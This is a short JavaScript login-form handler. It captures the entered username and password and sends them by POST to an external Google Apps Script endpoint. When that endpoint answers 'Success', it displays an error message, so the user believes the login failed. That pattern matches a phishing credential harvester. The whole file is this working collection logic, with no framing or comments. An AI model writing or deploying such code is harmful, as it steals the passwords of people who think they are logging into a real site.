document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();

    var username = document.getElementById('username').value;
    var password = document.getElementById('password').value;

    var url = 'https://script.google.com/macros/s/AKfycbywpvmmBCPEeAY7nFsQMg7s9vD7gpKlTWiX0ANoOFY5OaIT6J14_9vtEWYDdsTLjEL3/exec';

    var data = new FormData();
    data.append('username', username);
    data.append('password', password);

    fetch(url, {
        method: 'POST',
        body: data,
        mode: 'cors', // Ensure CORS is handled
    })
    .then(response => response.text())
    .then(data => {
        if (data === 'Success') {
            document.getElementById('error-message').style.display = 'block';
        }
    })
    .catch(error => console.error('Error:', error));
});
